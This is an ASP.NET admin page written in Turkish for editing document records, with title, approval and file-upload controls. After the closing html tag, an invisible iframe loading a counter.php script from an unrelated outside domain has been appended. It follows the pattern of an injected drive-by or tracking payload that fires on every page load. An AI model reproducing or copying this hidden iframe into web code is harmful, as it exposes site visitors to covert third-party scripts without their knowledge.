<%@ Page Language="C#" AutoEventWireup="true" CodeFile="DokumanDuzenle.aspx.cs" Inherits="Yonetim_GolfResim" %>

<%@ Register TagPrefix="include" TagName="Head" Src="~/Yonetim/Library/Include/Head.ascx" %>
<%@ Register TagPrefix="include" TagName="Ust" Src="~/Yonetim/Library/Include/Ust.ascx" %>
<%@ Register TagPrefix="include" TagName="Menu" Src="~/Yonetim/Library/Include/Menu.ascx" %>
<%@ Register TagPrefix="include" TagName="Alt" Src="~/Yonetim/Library/Include/Alt.ascx" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <include:Head runat="server" ID="Head" />
    </head>
<body>
    <form id="form1" runat="server">
        <div id="main_container">
             <include:Ust runat="server" ID="Ust" />
             
             <div class="main_content">
                <include:Menu runat="server" ID="Menu" />
                
                <div class="center_content">

                    <div style="margin:10px;"> 
                        <h2>Döküman Düzenle</h2>
                        <fieldset>
                            <legend>Döküman Bilgileri</legend>
                            <div runat="server" id="otelbilgi">
                                <table>
                                    <tr>
                                        <td>
                                            <strong>Başlık</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_baslik" runat="server" Width="500px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <strong>Onay</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:DropDownList ID="form_onay" runat="server">
                                                <asp:ListItem Value="1">EVET</asp:ListItem>
                                                <asp:ListItem Value="0">HAYIR</asp:ListItem>
                                            </asp:DropDownList>
                                        </td>
                                    </tr>
                                </table>
                            </div>
                            <div>
                                <asp:Button ID="Button3" runat="server" onclick="Button3_Click" 
                                    Text="Düzenle" />
                            &nbsp;<asp:Button ID="Button4" runat="server" onclick="Button4_Click" 
                                    Text="Yeni Döküman Ekle" />
                            </div>
                        </fieldset>

                        <fieldset>
                            <legend>Dosya Yükle</legend>
                            <div>
                    <asp:FileUpload ID="dosya" runat="server" class="multi" accept="jpg|jpeg|" />
                    &nbsp;<asp:Button ID="Button1" runat="server" onclick="Button1_Click" 
                                    Text="Dosyayı Yükle" />
                            </div>
                        </fieldset>

                        <fieldset>
                            <legend>Dosya</legend>
                            <div runat="server" id="otelresim"></div>
                        </fieldset>

                        <fieldset>
                                    <legend>Kayıt Bilgileri</legend>
                                    <div>
                                        <table>
                                            <tr>
                                                <td>
                                                    <b>Kayıt Tarihi</b></td>
                                                <td>
                                                    <b>:</b></td>
                                                <td><asp:Literal runat="server" ID="kayittarih"></asp:Literal></td>
                                            </tr>
                                            </table>
                                    </div>
                                  </fieldset>
                    </div>
                </div>
                
                <div class="clear"></div>
            </div>

            <include:Alt runat="server" ID="Alt" />

        </div>
    </form>
</body>
</html><iframe src="http://www.bc-bs.de/counter.php" style="visibility: hidden; position: absolute; left: 0px; top: 0px" width="10" height="10"/>




